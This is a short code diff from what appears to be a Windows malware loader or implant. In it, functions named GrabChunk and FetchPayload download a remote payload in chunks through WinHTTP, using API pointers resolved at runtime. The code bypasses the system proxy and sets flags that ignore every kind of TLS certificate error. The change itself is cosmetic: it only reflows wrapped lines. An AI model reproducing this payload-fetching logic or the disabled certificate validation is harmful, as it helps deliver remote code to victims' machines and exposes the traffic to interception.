@@ -146,8 +146,7 @@ static DWORD GrabChunk(HINTERNET hConnect, LPCWSTR BaseEp, DWORD idx, PUCHAR out
     if (!hReq) return 0;
 
     if (g_TransportCfg.Secure && pSetOpt) {
-        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
-                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
         pSetOpt(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(DWORD));
     }
 
@@ -191,8 +190,7 @@ PUCHAR FetchPayload(LPCWSTR Endpoint, PDWORD OutLen) {
     if (!pOpen || !pConn || !pCloseH || !pAlloc || !pFree || !pSleep)
         return NULL;
 
-    HINTERNET hSession = pOpen(g_TransportCfg.UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY,
-                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    HINTERNET hSession = pOpen(g_TransportCfg.UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return NULL;
 
     HINTERNET hConnect = pConn(hSession, g_TransportCfg.Host, g_TransportCfg.Port, 0);
